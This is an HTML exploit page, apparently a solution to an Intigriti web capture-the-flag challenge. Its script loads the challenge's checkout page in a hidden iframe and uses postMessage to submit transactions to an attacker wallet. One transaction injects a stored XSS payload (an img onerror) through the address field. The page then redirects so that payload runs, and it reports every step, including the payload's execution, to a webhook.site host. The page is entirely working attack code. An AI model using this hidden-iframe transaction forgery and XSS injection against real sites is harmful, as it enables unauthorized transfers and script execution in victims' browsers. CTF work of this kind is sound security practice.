<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>EXPLOIT LOADED</h1>
    <p>Sending transactions...</p>

    <script>
        const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
        const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
        const BASE = 'https://challenge-0126.intigriti.io';

        // Track exploit start
        fetch(`${WEBHOOK}?step=start&status=loaded`, { mode: 'no-cors' }).catch(() => {});

        // Create hidden iframe with checkout page
        const f = document.createElement('iframe');
        f.style.display = 'none';
        f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;

        f.onload = () => {
            fetch(`${WEBHOOK}?step=iframe_loaded&status=ready`, { mode: 'no-cors' }).catch(() => {});

            setTimeout(() => {
                // Transaction 1: Send 1337COIN to your wallet
                f.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                fetch(`${WEBHOOK}?step=tx1_sent&status=done&to=${YOUR_WALLET}`, { mode: 'no-cors' }).catch(() => {});
                console.log('TX #1 sent to ' + YOUR_WALLET);

                // Transaction 2: XSS payload - img onerror executes automatically when page loads
                // Payload: <img src=x onerror="alert('gigawatz')">
                // This gets rendered directly in innerHTML of marketwatch
                const xssPayload = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}?xss_executed=1',{mode:'no-cors'})">`;

                f.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xssPayload,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                fetch(`${WEBHOOK}?step=tx2_sent&status=done&xss=${encodeURIComponent(xssPayload.substring(0,50))}`, { mode: 'no-cors' }).catch(() => {});
                console.log('TX #2 sent with XSS');

                // Redirect to marketwatch to trigger XSS
                setTimeout(() => {
                    fetch(`${WEBHOOK}?step=redirecting&status=to_marketwatch`, { mode: 'no-cors' }).catch(() => {});
                    window.location = `${BASE}/marketwatch.html`;
                }, 3000);
            }, 5000); // Wait 5 seconds for checkout to fully load
        };

        document.body.appendChild(f);
    </script>
</body>
</html>
